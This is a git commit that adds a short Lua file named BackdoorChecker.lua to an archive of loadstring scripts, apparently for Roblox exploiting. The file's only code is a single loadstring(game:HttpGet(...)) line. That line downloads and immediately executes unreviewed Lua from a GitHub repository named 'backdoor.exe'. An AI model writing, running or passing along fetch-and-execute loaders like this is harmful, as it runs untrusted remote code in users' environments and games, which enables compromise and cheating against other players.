0e231f189d25cf17efecd70353e290ca7165238c
timedmarch <59752762+CenteredSniper@users.noreply.github.com>
2024-05-20 04:38:11 -0700

    Create BackdoorChecker.lua

---
+++ Archive/Loadstrings/BackdoorChecker.lua
@@ -0,0 +1,8 @@
+--[[ // METADATA
+
+Last Modified: 5/15/2020 4:55AM
+Author: ???
+
+--]]
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
